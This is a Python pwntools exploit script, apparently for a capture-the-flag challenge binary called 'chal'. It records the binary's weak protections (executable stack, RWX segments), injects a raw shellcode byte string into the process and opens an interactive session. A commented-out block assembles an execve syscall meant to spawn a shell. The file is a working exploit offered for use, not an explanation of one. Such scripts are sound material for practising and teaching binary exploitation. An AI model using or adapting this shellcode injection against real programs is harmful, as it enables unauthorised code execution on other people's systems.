#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

#with open('shellcode.txt','r') as f:
#    asciibytes = f.read()
asciibytes = "b8 bd d0 c1 40 05 7e 2f 3e bf bc e1 60 11 3c 81 f4 e9 40 51 3c 8b fc"
shellcode = bytes.fromhex(asciibytes)

# Test
# code = [
#     b"\xb8\x3b\x00\x00\x00", # mov eax, 0x3B
#     b"\xbf\x08\x20\x40\x00", # mov edi, 0x402008
#     b"\xbe\x00\x00\x00\x00", # mov esi, 0x0
#     b"\xba\x00\x00\x00\x00", # mov edx, 0x0
# ]
# shellcode = b"".join(code)
# end Test

io.sendline(shellcode)
io.interactive()

